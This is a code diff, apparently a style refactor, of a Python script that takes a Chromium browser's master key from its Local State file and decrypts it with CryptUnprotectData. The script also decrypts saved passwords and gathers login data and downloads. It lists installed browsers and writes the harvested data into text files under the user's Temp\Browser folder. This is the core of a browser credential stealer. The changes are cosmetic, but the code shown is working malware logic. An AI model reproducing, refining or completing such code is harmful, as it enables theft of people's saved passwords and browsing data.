@@ -50,8 +50,7 @@ def get_master_key(path: str):
 
     master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
     master_key = master_key[5:]
-    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-    return master_key
+    return CryptUnprotectData(master_key, None, None, None, 0)[1]
 
 
 def decrypt_password(buff: bytes, master_key: bytes) -> str:
@@ -70,10 +69,16 @@ def save_results(browser_name, data_type, content):
 
     if not os.path.exists(user+'\\AppData\\Local\\Temp\\Browser'):
         os.mkdir(user+'\\AppData\\Local\\Temp\\Browser')
-    if not os.path.exists(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}'):
-        os.mkdir(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}')
+    if not os.path.exists(
+        f'{user}\\AppData\\Local\\Temp\\Browser\\{browser_name}'
+    ):
+        os.mkdir(f'{user}\\AppData\\Local\\Temp\\Browser\\{browser_name}')
     if content is not None:
-        open(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}\\{data_type}.txt', 'w', encoding="utf-8").write(content)
+        open(
+            f'{user}\\AppData\\Local\\Temp\\Browser\\{browser_name}\\{data_type}.txt',
+            'w',
+            encoding="utf-8",
+        ).write(content)
     total_browsers += 1
 
 def get_login_data(path: str, profile: str, master_key):
@@ -203,11 +208,7 @@ def get_downloads(path: str, profile: str):
 
 
 def installed_browsers():
-    results = []
-    for browser, path in browsers.items():
-        if os.path.exists(path):
-            results.append(browser)
-    return results
+    return [browser for browser, path in browsers.items() if os.path.exists(path)]
 
 
 def mainpass():
